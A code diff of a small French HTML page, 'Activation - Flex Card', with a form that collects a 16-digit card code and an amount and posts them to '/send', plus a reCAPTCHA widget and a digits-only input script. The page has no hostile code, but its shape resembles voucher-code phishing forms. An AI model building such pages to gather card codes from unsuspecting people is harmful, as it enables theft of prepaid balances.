@@ -2,40 +2,22 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Flex Card - Activation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Activation - Flex Card</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="logo">
-    <img src="logo.png" alt="Flex Card" width="150">
-  </div>
 
   <div class="container">
-    <h2>Bienvenue</h2>
+    <img src="logo.png" alt="Logo Flex Card" class="logo">
+    <h1>Bienvenue</h1>
     <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>
-    
-    <form action="/envoyer-code" method="POST">
-      <input
-        type="text"
-        name="numeroCarte"
-        placeholder="Code de la carte"
-        required
-        maxlength="16"
-        pattern="\d{16}"
-        title="Entrez un code de carte de 16 chiffres"
-      >
 
-      <input
-        type="text"
-        name="montant"
-        id="montant"
-        placeholder="Montant"
-        required
-        pattern="\d+"
-        title="Veuillez entrer uniquement des chiffres"
-      >
+    <form action="/send" method="POST">
+      <input type="text" name="code" placeholder="Code de la carte" maxlength="16" required pattern="\d{16}" title="16 chiffres uniquement">
+      <input type="text" name="montant" placeholder="Montant" id="montant" required pattern="\d+" title="Chiffres uniquement">
 
-      <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTvVKGjCD6Qw4amYtqzws"></div>
+      <div class="g-recaptcha" data-sitekey="6Lc1nR4rAAAAAJOR11moTVvKGjCD6Qw4amYtqzws"></div>
 
       <button type="submit">Activer ma carte</button>
     </form>
@@ -49,8 +31,7 @@
 
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
-    // Empêche l'entrée de lettres et de symboles dans le champ "montant"
-    document.getElementById('montant').addEventListener('input', function (e) {
+    document.getElementById('montant').addEventListener('input', function(e) {
       this.value = this.value.replace(/[^\d]/g, '');
     });
   </script>
